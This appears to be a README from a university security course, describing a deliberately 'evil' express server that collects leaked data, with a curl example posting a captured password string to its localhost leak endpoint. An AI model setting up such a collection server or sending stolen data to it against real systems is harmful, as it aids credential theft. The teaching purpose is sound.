### Insecure Web Servers and Web Applications

# The Evil Leaked Data Collection Server

A very simple web socket server collecting data:


## Startup 

* Startup the broken node (express) server


	```
	startup.sh
	```
	
## Details

* Send any **leaked data** to the server with curl, e.g.:

	```
	curl \
    -X POST 'http://localhost:3000/info/leak' \
    -H 'Content-Type:text/plain' \
    --data "Hurray, we found the pwd:5ecUrE"

	``` 

- - -

		
Find this project at: <https://git-iit.fh-joanneum.at/Feine/omd-web-devel/-/tree/master/Part-13-Security/InsecureServers/01-LiveReporting>